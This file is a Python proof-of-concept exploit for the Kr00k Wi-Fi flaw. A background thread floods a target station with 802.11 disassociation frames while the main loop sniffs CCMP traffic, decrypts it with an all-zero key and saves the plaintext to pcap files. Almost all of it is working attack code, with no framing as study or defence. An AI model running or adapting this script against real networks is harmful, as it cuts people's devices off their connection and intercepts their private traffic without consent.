#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys, os, time, re, threading, logging
from scapy.all import *
from scapy.sendrecv import sniff, sendp
from scapy.layers.dot11 import Dot11, RadioTap, Dot11CCMP, Dot11FCS
from Crypto.Cipher import AES
from subprocess import run, PIPE

intfmon = 'mon0'
workdir = '/tmp'
filename = workdir + '/' + 'kr00k.pcap'
station = '00:11:22:33:44:55'
bssid = '55:44:33:22:11:00'

def disassociation():
    """
    send disassociation packet to target 
    """   
    count = 10
    while True:
        pkt = RadioTap()/Dot11(addr1=station,addr2=bssid,addr3=bssid)/Dot11Disas(reason=7)
        sendp(pkt, iface=intfmon, count=count, verbose=False)
        print("DISASSOCIATION PACKETS SENT TO: " + station + " FROM: "+ bssid)
        time.sleep(10)

def decrypt(pkt):
    """
    try to decrypt traffic using all-zero tk
    """
    try:
        addr1 = re.sub(":","",pkt.addr1)
        addr2 = re.sub(":","",pkt.addr2)
        addr3 = re.sub(":","",pkt.addr3)
        # print(pkt.addr2)
        # addr4 = re.sub(":","",fcs.addr4)
        PN = "{:02x}{:02x}{:02x}{:02x}{:02x}{:02x}".format(pkt.PN5,pkt.PN4,pkt.PN3,pkt.PN2,pkt.PN1,pkt.PN0)
        # Priority Octet "00" 
        nonce = bytes.fromhex("00") + bytes.fromhex(addr2) + bytes.fromhex(PN)               
        TK = bytes.fromhex("00000000000000000000000000000000") #TK
        cipher_text = pkt.data[:-8]
        cipher = AES.new(TK, AES.MODE_CCM, nonce, mac_len=8)
        # cipher.update(AAD)
        plain_text = cipher.decrypt(cipher_text)
        assert plain_text.startswith(b'\xaa\xaa\x03'), "All-0 TK failed to decrypt"
        eth_header = bytes.fromhex(addr3 + addr2) + plain_text[6:8]
        packet = eth_header + plain_text[8:]

        if station.lower() == pkt.addr2:
            print('kr00k PACKET ARRIVED FROM THE STATION!')
        elif bssid.lower() == pkt.addr2:
            print('kr00k PACKET ARRIVED FROM THE AP!')
        else:
            print('kr00k PACKET ARRIVED!')

        if filename:
            wrpcap(filename + ".decrypted", packet, append=True)
            wrpcap(filename + ".encrypted", pkt, append=True)

    except AssertionError:
        pass
        # print('All-0 TK failed to decrypt this CCMP packet')


# Start threading
t = threading.Thread(target=disassociation)
t.daemon = True
t.start()

# Capture Dot11CCMP packets
sniff(iface=intfmon, prn=decrypt, lfilter=lambda pkt:(Dot11CCMP in pkt))

